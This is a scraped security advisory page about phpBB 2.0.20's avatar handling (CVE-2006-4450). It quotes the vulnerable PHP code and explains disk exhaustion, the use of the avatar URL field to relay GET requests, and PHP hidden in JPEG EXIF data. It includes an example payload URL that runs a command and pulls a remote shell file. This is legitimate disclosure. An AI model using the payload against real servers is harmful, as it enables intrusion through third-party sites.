=== Content from cxsecurity.com_1cdee2e4_20250126_034535.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from securityreason.com_3573c5cf_20250124_214957.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **PHPBB 2.0.20 persistent issues with avatars** **2006.08.31** Credit:  **[rgod](https://cxsecurity.com/author/rgod/1/)**  Risk: **Medium** Local: **No** Remote: ****Yes**** CVE: **[CVE-2006-4450](https://cxsecurity.com/cveshow/CVE-2006-4450/ "Click to see CVE-2006-4450")** CWE: **N/A** CVSS Base Score: **5.1/10** Impact Subscore: **6.4/10** Exploitability Subscore: **4.9/10** Exploit range: **Remote** Attack complexity: **High** Authentication: **No required** Confidentiality impact: **Partial** Integrity impact: **Partial** Availability impact: **Partial** | | --- | |
| --- | --- | --- | --- |

PHPBB 2.0.20 multiple issues with avatars
some problems persistently lie in the way it handles remote and uploaded avatars:
a remote user can:
(1) saturate the server with unuseful files, 'cause phpbb do not delete
the previous one when you upload a new avatar
(2) use PhpBB installations to launch exploits against other servers,
using "avatarurl" argument when you modify your profile as path
of a GET request.
Look usercp\_avatar.php near lines 125-153:
...
if ( $avatar\_mode == 'remote' && preg\_match('/^(http://)?([w-.]+):?([0-9]\*)/(.\*)$/', $avatar\_filename, $url\_ary) )
{
if ( empty($url\_ary[4]) )
{
$error = true;
$error\_msg = ( !empty($error\_msg) ) ? $error\_msg . '<br />' . $lang['Incomplete\_URL'] : $lang['Incomplete\_URL'];
return;
}
$base\_get = '/' . $url\_ary[4];
$port = ( !empty($url\_ary[3]) ) ? $url\_ary[3] : 80;
if ( !($fsock = <img src="/imgs/at.gif" border=0 align=middle>fsockopen($url\_ary[2], $port, $errno, $errstr)) )
{
$error = true;
$error\_msg = ( !empty($error\_msg) ) ? $error\_msg . '<br />' . $lang['No\_connection\_URL'] : $lang['No\_connection\_URL'];
return;
}
<img src="/imgs/at.gif" border=0 align=middle>fputs($fsock, "GET $base\_get HTTP/1.1rn");
<img src="/imgs/at.gif" border=0 align=middle>fputs($fsock, "HOST: " . $url\_ary[2] . "rn");
<img src="/imgs/at.gif" border=0 align=middle>fputs($fsock, "Connection: closernrn");
unset($avatar\_data);
while( !<img src="/imgs/at.gif" border=0 align=middle>feof($fsock) )
{
$avatar\_data .= <img src="/imgs/at.gif" border=0 align=middle>fread($fsock, $board\_config['avatar\_filesize']);
}
<img src="/imgs/at.gif" border=0 align=middle>fclose($fsock);
...
phpbb do not check if the user supplied value ends with an image extension, neither
checks if the supplied string contains "&" and "?" chars. So, you can submit a value
like this:
http://some\_vulnerable.host/somescript.php?cmd=ls%20-la&xpl=http://somehost/someshell.txt
phpbb will launch a GET request like this:
GET /somescript.php?cmd=ls%20-la&xpl=http://somehost/someshell.txt HTTP/1.0
HOST: some\_vulnerable.host
Connection: close
obviously you have no output, but this makes phpbb to be like a http proxy
(3) inject some php code inside jpeg files as EXIF metadata content:
this, in combinations with third party vulnerable code can be used
to compromise the server where PHP is installed.
Should be enough to check for php code inside the temporary files
before to copy the new avatar in "images/avatars/" folder.
rgod
---------------------------------------------------------------------------------
mail: rgod [at] autistici [dot] org
site: http://retrogod.altervista.org

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2006080177)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from cxsecurity.com_96e4266a_20250126_034535.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---


